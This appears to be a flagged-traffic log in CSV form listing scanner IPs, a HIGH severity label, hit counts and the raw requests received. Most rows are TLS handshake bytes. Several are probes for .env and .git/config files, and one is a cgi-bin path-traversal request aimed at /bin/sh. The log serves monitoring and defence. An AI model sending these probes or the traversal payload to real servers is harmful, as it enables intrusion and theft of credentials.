198.235.24.46,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03[\x1Ab\xF5-\xDA*\xB6\xC8%f\x19\x8F\xB6\xCA\x87v\xC2"
198.235.24.70,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xF8\x0F\xEB\x07\xF6V\xFD\x0B2\x88(D@\xA2\xED\x8F\x0F`\x"
198.235.24.78,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC4"
204.76.203.215,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x0B+\xEA\xAC\x96&\xF3__\xAF\xAF{\x96w\xA5$=\x9C\xED\x22"
205.210.31.165,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03a\x22u\xDF\x96\xC7\xC5w\xF1\x87\xA66\xFE\xD5\xC3\xC8\xD7"
205.210.31.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03J\xE0\xDD\x9D\x86\xE8kR\xF9\xF4#\xFCBr\x11\xFE(\xFEi\x84"
205.210.31.197,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03Tuqx2T@\xE0B\xC2\xC2\xEF\xA3\x9D\xC8\x8C\xAF\xAC\x83N\x9"
205.210.31.211,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03P\xA8\x93\xDE\x08\xCBb\xA8c\xFFi\xB6Qy|\x7FN\x9B\xADW\x8"
205.210.31.46,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xD9EF\xFEhI\xE5J\xC1\xAC$CY\x18\xC2\x91\x86\xF9f\x87%\x"
205.210.31.70,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03iu\x87a\x9A\xDF\x01uj\xDE\x9E\xAA:\x07\xBF\xB8N\x8E\xA75"
205.210.31.73,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03J\xB3\x11\x83\xB7\x1C\xA6\x1EO\x9A};\x01\x04X\xD1\xBC\x0"
205.210.31.87,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03|\xC5\x1C\x8A\x07[\xA8\xAB\xCD\x06A\x10\xC5\x04\x1A\xEB\"
206.168.34.124,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x01\x9Bn\xA0\xE0Q^<\xE5,\x8B\x03 \xF8\x7F\xDD\x02\x87\"
206.168.34.202,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF4|\xB0E\xAE|\xB28\xD8c\xC4tE2\x1A\xA2\x19)\xF9\x13\x8"
206.168.34.217,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB7\xC2 \xB52=\x9Ac^M'\x07\x9Db\x22\xC4\xAD\xC5\xC2\x90"
209.38.23.58,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_+\xCB}-J\xD4\x5C913\xA1WQ8\xE4[x)\xEF^-\x8B\xC9\xE1t\x14\xC0h"
35.163.180.208,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03\x80-\xE7\xD4V\x8AQ\x80r\xFC\xBE\x8C\x99'\x96"
43.138.5.244,HIGH,2,"GET /.env HTTP/1.1"
44.199.243.124,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03$\x86\xB3&\x9A\xBF\x1AL\xFE/\xD9\x95f{\xF6\xD9\xFB\x5C\x"
44.200.116.188,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03d\xEAqD\x86\xA0S\xC1\x95\xB3(\xEEL\xDE\x82~\xF7b\x02\x15"
45.79.172.21,HIGH,2,"\x16\x03\x01\x01"
45.79.181.223,HIGH,2,"\x16\x03\x01\x01"
45.88.186.70,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xF9\x8C-\xEC\xD0\x97R\x8D&m\x016\xA7#\xBA8\x11\x10\xE6\"
47.251.93.227,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03d\xFCO\xC6X\xED_@\xD5\x91\xCF\xD7p/\xEA\xC8\xF8\x15\xEF\xA9\xC"
64.225.100.236,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03d\x8F-\xE4s\x96\xC6\xDE\x05$5\x19\xBFiT\xCD\xAC\xCDl\x0B"
64.227.66.177,HIGH,2,"GET /.env HTTP/1.1"
64.23.228.52,HIGH,2,"GET /.env HTTP/1.1"
64.23.251.93,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8C\xF5\xBD\xBA\xC28\xAE"
65.49.1.108,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03C\x8CI>\xCBC\xE0\x05\xCC\xAC\x19\xDBY\xC4\x14\xC7\xC3%\x95\x92"
66.132.153.126,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xCC\xCF\xB3~\x0E\xA2\xFB\xC7\xB7\x93\x94%\x16\xFFopsXS\"
80.82.70.133,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
81.29.142.100,HIGH,2,"\x16\x03\x01\x05\xFC\x01\x00\x05\xF8\x03\x03*\x19#\x98\x18T\x83\xF5VeW\xBD"
89.42.231.184,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03P\xBEC{0+R\x00\x16\xF0\xE7~T3Bq2\xA4\x1B\x04\xC4\xC9\xEA"
92.63.197.197,HIGH,2,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x0C"
104.234.32.31,HIGH,2,"GET /redmine/.env HTTP/1.1"
104.248.42.184,HIGH,2,"\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\xFD\x08\x01g5\xC33H\xEB\xE0O9\xA7\xE7\xA1\xC3\xD5\x9D\xA0(\xD"
134.199.153.215,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC3g\xE7\x16_4R\xBE\x90Q\xD5\xEE\x19[\x8F\xD38\xA8\xDF\x9A\xD"
138.68.169.215,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC0t\x5C\x07"
147.185.132.144,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC0n\xBCi7H!\x89'\x81\x0F$\xF5j C\x11\xAF\xA2.tl\x9E\xB"
147.185.132.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x5C\xD7=c\xC7K\xF3\xC8\xC7\xF5N\xDCRi\xBEf\xF5Z\x87E\xC"
147.185.132.177,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I\x90)YSC\x8F\xE7\xB8\xC8\xD5\xD2\xB4\x8E]d\xD9\x9C=b?\x"
147.185.132.21,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x11~\x12`d\x0B\x85\xA0"
147.185.132.42,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xED\xE0\xD0\x05\x95\xF8\xC2\xFD"
147.185.132.48,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03A\xE4\x94@VP\x99\xD6\xC5\xDC\xD4\xB8\x00\xBB\x82\xEB9\xD"
147.185.132.9,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03bTA\xFF\xD0M\xFE\x18&\x9B\x82\x96?h\xFCc\x10\xD6<\x96\xA"
157.230.247.11,HIGH,2,"GET /.env HTTP/1.1"
159.203.44.163,HIGH,2,"GET /.env HTTP/1.1"
159.65.220.226,HIGH,2,"GET /.env HTTP/1.1"
159.65.96.43,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFB\xB7\xF8MB\xCA\x9F\x85\x9D\xCA\xD1\xEF\xC8q'#h5}:H\xB813g\"
161.35.84.53,HIGH,2,"GET /.env HTTP/1.1"
162.142.125.223,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF0\xE8\xA5i\x9BP6Q\xEC\xD7R\xED\xCA\xEC\x0EM\xFBjG\xF2"
162.142.125.32,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03`\xF1r\x073P\xD9\x16}\xC7qs\xFBxx\xD9\xB1\xA0\xD1\xE1\xF"
162.243.42.29,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Q\xC1=:\xC7!\x5C-C^\x8CP\x10\xDDl\x8B\x22;x\xBC\x9C\xE1\x92\xE"
165.227.40.87,HIGH,2,"GET /.env HTTP/1.1"
167.94.138.186,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD9\xDE\xC8?\xDEJ,\x85T\xDF\x9E\x7F\xEA-\xFB\x12b\x88"
172.236.228.111,HIGH,2,"\x16\x03\x01\x01"
173.239.240.66,HIGH,2,"GET /docker/.env HTTP/1.1"
173.239.240.68,HIGH,2,"GET /script/.env HTTP/1.1"
173.239.240.72,HIGH,2,"GET /fedex/.env HTTP/1.1"
173.239.240.85,HIGH,2,"GET /.env.dist HTTP/1.1"
174.138.6.31,HIGH,2,"GET /.env HTTP/1.1"
178.128.220.111,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8E\xB2\xE0\xC6\x0C\x9E\xEB\x8Ct"
181.215.65.80,HIGH,2,"GET /local/.env HTTP/1.1"
181.215.65.81,HIGH,2,"GET /cp/.env HTTP/1.1"
188.166.59.42,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\xB2%l\xF6)\xAC\xC8\x89\x88\xFBM6\xB0s\x1E\xD5\xD4\xDC\x06\xC"
198.235.24.168,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x7F\x80\x9D\xDCU\x0B^X\x17I*j\xDENY\x9D#(\xDC\xA8 5p\xD"
198.235.24.211,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xCD\x9AJ1\xAE\xBE\x12\x1B\xF4\xE2\xBAm\xC8!r\x80xw~yw\x"
198.235.24.212,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03v\x88\xDBuG\x89>Y+I5\x06\x9D\xECI\xADX\xFC\xFE\xD2]G\xD3"
198.235.24.245,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8307\xB9\x04\x1FA\xF5X\xB7[MRx\x91y\xE4@\x12l(\x13\xBC"
205.210.31.109,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x8F\xD5\xC4\x91\xA9\xCE\x16\x13O\x5C\xD1\xF4\x5CD\xCEF\"
205.210.31.222,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03 wT\x05\xF2f%q,/;\xFA\xC9j\xA22:Ql\x88\xEA\x83\x8E\xD3Nz"
205.210.31.245,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03z:\x88 \xA3J|\xB0\xA8\x07\x10e\x8E\xBB\x15\x87\xD3~\xAB\"
205.210.31.65,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x031\x05\x11\x10>r\x92\xAE\x88GQl\xC7\xA6\xEC_\xCE\xD0\xE9K"
206.168.34.45,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03(n R\xAB\xB1\xFCG\xEE\x1FJ\xFE\xA3\x8C%\xD0\xC3\x94\x02n"
209.97.187.57,HIGH,2,"GET /.env HTTP/1.1"
216.180.246.11,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xBC\x8B\x04\x8C\x0Bd~\x82\x13\x8B\x1C\xB5\xBB\x85\x"
31.14.32.6,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAD\xA7\x04\x02\xFC\xB5P4\x8F\xA7\xD6\x9C\x80\xEAkq\x1D"
35.216.195.77,HIGH,2,"GET /.env HTTP/1.1"
35.92.88.4,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03^\xDBj\xDA\xC7\xF0\xE2\xB8\x99\x90P\xCD`\x1Fu\xDD\x0EuN|"
41.249.216.6,HIGH,2,"GET /.env HTTP/1.1"
42.113.60.198,HIGH,2,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.91.64.6,HIGH,2,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03VQ\xC8V07\xC0\xC3\x16\xE7\xBAK\x02\xAB\xF3\xEE\xCD\xDC\x"
51.38.248.14,HIGH,2,"GET /.env HTTP/1.1"
52.12.6.13,HIGH,2,"\x16\x03\x01\x00\xFE\x01\x00\x00\xFA\x03\x03\x02\x02U\x8A~\x1D\x81\x02\xD4'\xC3\xC4\x1B~\xFE:\xD3\xE"
64.23.190.42,HIGH,2,"GET /.env HTTP/1.1"
64.23.209.139,HIGH,2,"GET /.env HTTP/1.1"
65.49.1.122,HIGH,2,"GET /.git/config HTTP/1.1"
65.49.1.202,HIGH,2,"GET /.git/config HTTP/1.1"
66.132.153.133,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFA\x22\xAB'R\x0Bkdh\x16\x9A\x1A\x05\x05\xE3L\xB4\xB2\x"
66.132.153.135,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xDAgv\xDB1\xD0\x16*(\xAB\x7F\xD0C\x9D\x16b\xBB\x09\"
68.183.8.140,HIGH,2,"GET /.env HTTP/1.1"
85.237.194.175,HIGH,2,"GET /docker/.env HTTP/1.1"
88.199.21.18,HIGH,2,"\x16\x03\x03\x00\x92\x01\x00\x00\x8E\x03\x03i~\xB2\x02\xAEw`\xF7\xEF\xFAE\xD9\xFB\xC2=\x86Q\x9Cm\xD0"
118.26.36.18,HIGH,2,"\x16\x03\x01\x01\x03\x01\x00\x00\xFF\x03\x03d~\xB3\xE9\xC2g\x8D\xFBU#@X\x05\x08\xBB\x94\xDF]\x96\xA6"
137.184.202.40,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03&76r\xF9GIp\x80\xDA\xB1v\xBE\xDC\x93\x0E\x10\x89\xD8\xA6\x00p\"
138.197.156.223,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1B\xAB\xB8\x91\x8DZ\x8B\xA6]\xC3\xC3\xEF\xCF$\xD3\xB9\xC1\xE"
162.142.125.196,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03j\x9Bp*7\xB3Y\xE6\x1F\xB7\xC6\x15\x0E\x1B~\x5C\x0E\xCC\x"
162.243.99.107,HIGH,2,"GET /.env HTTP/1.1"
172.236.228.224,HIGH,2,"\x16\x03\x01\x01"
195.177.94.73,HIGH,2,"GET /.env HTTP/1.1"
198.235.24.139,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA7\x01\xB8\x06\xBE\xBA\x84\xC5\xC3\xE6-&x\xB0\x19!p\xE"
216.180.246.61,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x06\xFC\xDC/`\xC8"
45.79.181.251,HIGH,2,"\x16\x03\x01\x01"
64.226.81.53,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xD7\xD9,\xCC\x1E\x94gQ6+\x12\xB0t\xB1\xD8\x0Fz\xDC\xE7\"
66.132.153.114,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8A\xD4#\xB7HR\x9F\x16\xEB-\xC1\xDD#,\x17C\x92q\x8D\xC0"
93.174.93.12,HIGH,2,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
101.198.0.182,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x03\xA7\x88\x93\xE7u\xEFH9s\xBA;\x9F\x0Bw\x9D\xAB;\x9F\xB0\xFB\xF"
101.36.108.158,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03Mb|\xE8\xB3\xB9\x14O\x0F;;C\xAA\xF2\x85\xCD#\xD5)\x9D{\x"
103.218.241.7,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\x0FP\xF9\xB7\xC4\xA1\x13\xD0\x85\xB2\x8C\x8E\x93\xCA\xA"
104.152.52.143,HIGH,1,"\x16\x03\x01\x05\xCA\x01\x00\x05\xC6\x03\x03S\xDB\xF8\x15\x11\xBE\xE7\xBB\x17K\xFA\xE3h\x89u\xD3\x1A"
107.150.117.121,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xFE\xE5\xBF*\xCA&\xFC\x9551%\xE9\x03N\xC2qI\xEBb\x94\x1"
112.187.172.15,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x013c6\x8E\xB2Y;\xE7\x9A\xDD\x18ut\xB5\xD43\xEA\xED#\x9"
117.14.152.17,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC3\x80\xC4\x9An\xEC\x94a"
1.192.195.5,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x03w\xD9\xD9\x8A\x15\xED]b\xDC\xD9Ce\xE9\x1E\xA4Iq\x09\x85\xED\x1"
128.14.226.191,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xE3\x09VQ\x95t\xEA0\xD0HDg\x18i\xA4\xA6|\x92\xF04\x9BDd"
128.199.197.109,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xF4g\x1E\xB5g[\xBDW\x94W>\x00N\xC3\x08I"
143.198.184.130,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xA9D\x8A\x87S\xA3\xB6\xEA\xA0VCr1\xE8\xC4zs\x9E6\x98Gb\"
152.32.145.49,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03'\x0FB9\xA1\xC6\x1A"
161.35.155.32,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ks?\x9B\xFC\xF3\xCE\xCE\xB3\x0C,\xAEd\x02s\xD0+NHm\xEBn\x94"
162.142.125.117,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x13\x84\xB9\x9B\xA2\x043\xCC\xFF\xFF\x02\xE99\x81\x80\x"
162.142.125.123,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03w\x8C\x22 \x02"
162.142.125.198,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF0\x9C\xD5r\xE3+\xDE7j\x04\xE7N|\xD8\x03\x8D\xB7\x8C\x"
162.142.125.208,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03g\x00C'J\xC1\xC6s\xE3G\xA2\xF7\x88\xF9\x97\xDE\x85\xC3P\"
162.142.125.213,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1D$\xA0\xEF/Z"
165.154.41.6,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03p\x076(.(\xAE}1~\x01\xDC\xD4\xF5\xC4\x8A\x81\x16^C\x12\x"
165.227.162.253,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03<dZ\xB3m\xD3\xEF\x12c\xC3\xF6(m\xB8\xC3\xB5\x8Ao<\xEE\xF"
167.94.138.113,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF9f\x9E~\x1B\xD9|\x8A\xA2z\x9Dk\xCB|\xCD\x95\x05\xC9r\"
167.94.138.116,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB3?\xD8\x1C\xCA(\xCB@c<\x07c\x8F\x96\x17\x0CV+^+\x10\x"
167.94.138.166,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC6G\xD8\xA3\xF4a\x8C\xFC\xB7\xBE \xAF\xA95\x18\xF5\x82"
167.94.138.173,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03)\xE3\xA6!n\x05}\xDD_"
167.94.138.184,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD8\xF4jw\x98\xD0\xEC\x7Fh\x97\x8B\xAC:\xFFjE\xB4\xC4\x"
167.94.138.188,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x97\x9B\x04P\x8D67\x1F5\xE2\x18Ui\xB7U\xEA\x06O\xBE\xAD"
167.94.138.200,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC5\xB9\x11\x09h\x1B7\xBF\x09\xC08\xF6x\xE3r<\xFD\x0ChY"
167.94.138.50,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5C\xF2o\xC8\x07\xD1Z\xD5\x01\x19\xE2\xEF\xD5yl\x96\xB5"
167.94.138.58,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03]\x15X~\xAD}a\x91\xE2b\x01\x90\xC8y\xAF\x14/\x91\xBE\xD5"
167.94.146.62,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03F\x1B\xE9\x81BQ\xB7\x12\x96\x82S\xBA;~\x07\xD7\x86\xF1xE"
167.99.181.249,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xD6\xC9Y\xAC\xBB\x08\x04\xCB,d\xE1T\xC2\x22\xD3\xA4\xBE"
172.104.11.46,HIGH,1,"\x16\x03\x01\x01"
172.105.128.12,HIGH,1,"\x16\x03\x01\x01"
172.235.40.131,HIGH,1,"\x16\x03\x01\x01"
172.236.228.198,HIGH,1,"\x16\x03\x01\x01"
172.236.228.202,HIGH,1,"\x16\x03\x01\x01"
172.236.228.208,HIGH,1,"\x16\x03\x01\x01"
172.236.228.229,HIGH,1,"\x16\x03\x01\x01"
172.236.228.86,HIGH,1,"\x16\x03\x01\x01"
172.237.105.166,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03EI\x9CD\xE4\xC5\xC1\xDD\x80_E}\xF7\x8FuSK\xB8\x96:\xE5\x"
172.239.109.26,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03;\x16\x92\xD2\xCE\xE0\x15\x87\xB8\xEA\xDB\xB9\x8A\xA7\xC"
184.105.139.67,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFBI\xE2SA!\xEB\xE3\xB7\xC5R\xF1\xF1\x01\xFEb\xFE\x0Br\xB9Q\x"
184.105.139.68,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$\xCA\x1Dp\xA5\x22\x9F/\x85\xE1\xB3\x10\x5C\xCF\xED\xEC\xEB&a\"
184.105.139.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x92\x0CQ"
184.105.247.252,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03/\xC9(\xBA\x9D\xC8x\xCE\xF1\x85\x9C\xFD\x161DK\x016iFV\xAF\xC5"
184.105.247.254,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8B\x15c;N\xF8\x92f\xDEZ\x22\xB2\x08r\xD2*Ffg\x19\xA0/Q\x80=\"
185.242.246.125,HIGH,1,"\x16\x03\x01\x00\xE8\x01\x00\x00\xE4\x03\x03\xA9\xC0["
192.155.90.118,HIGH,1,"\x16\x03\x01\x01"
195.184.76.104,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x032\x96\xB08O&\xEFw'=\xFE\xBAf\xEC\xDD\xBC\x1F\xEE1\xB2\xB"
195.184.76.213,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xA7\x8F\xE6\x22b\xCF#\x0B\x08\x9C\x80i\xC0\x7F\x0B\xA63"
195.184.76.36,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03Q\xDC\xF8\xB4\xF3k\x92\xEC\xAA\xCF\xA1\x1AT\x1DP\x12d\xA"
199.45.154.118,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x98\x22\xE8\xF05\xDA\x87\xB0._\xA2(\x9F\x04\xEF\x03\xAC"
203.55.131.4,HIGH,1,"\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03}\x94O.\xA7\x9B}8\xA79\x95\x82\xAA\xE0l?9\xC7\x9D\x5C\x0"
204.76.203.73,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x8E\xB0\xB3L\x03\xA8`\x8E\xD0\xC1H\x06\xBC"
206.168.34.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03e\x9B\x1BX\xC5\xCE\x95\xEF\xA9Gblc\x82\x0EL>/f<\x83'\xD7"
206.168.34.195,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03O*\x99\x88O\xDE\x91\xB4\xAE\x9Aa3\xD2\xDB~\x22:<\xCErV\x"
206.168.34.211,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5CVi[:`\xA2i1\xD2\x8E\x99\x9F\xEFIcziu\x1B~YL\xE74\xCE"
216.180.246.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF16\xE4\x1F\xCE\xB6\x06\x07J\xD5y\xEE\xFFA\xDD\xF3BJ\x"
216.180.246.191,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xBFh\x5C\x0B\xE7\x9Fo\x95\x82$;\xA0M\x5C\x8B\xA17\x82\x"
216.180.246.208,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x85\x88=\x87&\xFC\xD0Of\xD9SuY\x06\xBB\xB5\xA0Urw\xC3\x"
216.180.246.216,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB0\x0FG\xC0?:\x12^;\xF9\xA2\x07\x9E\xEB\xD2\xB2G\x1C\x"
216.218.206.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x06+Q\xA1)U\x8A\x00\xF0\x13\xA1\x8A@s\xD4W|7\xBDS\x9F\xDCA-\x"
223.199.184.238,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x9B\x9DA\xA5^\xD7,\x13\x0F?\xDC\x7F\x82\x98\x86[\x01\xA"
27.115.124.40,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x035J>\x94\x90\xBA\xD1l@\xF7f\x94\x11\xC3\xDA\x12c\x15P\x96\xACa\"
31.14.32.4,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x7F>\x8Am\x1E\x9B\xC1\xE9\x09=n\xEF\xB8%\xE1\x876|{x\x9"
31.14.32.5,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03*\xE0\xCB]\xCB\xA6\xD2\xE3\x1A\x1Edt"
31.14.32.7,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03M\x1E\xDF9e0{\xB2L>\xD2\xA9\xE4\x97\xE0\x83\xC0(\xC0\xC4"
3.137.73.221,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD6\x8D\x97?\x81\xF1e\xDE\x06\x15H'\xE1\xA2\xE0/:\x1B!\x9F7\x"
3.140.198.248,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB0Z\x89p_\x17\x96H\xAC!\xD0b\xC0\xF6\xC2\xCE\xBA\x80l6\x04\x"
3.149.59.26,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC4f\xB3\xBF~\x92\xE5\x9C\xA4w\xD2[\x17\x83\xE3\xDE\x9D\xB0\x"
3.15.25.196,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCAcL\xC5,\xAA2\x13\x98\xBE0\xD7*\xEC\xF2\xC6\xB0N=d\xA9Y\xC3"
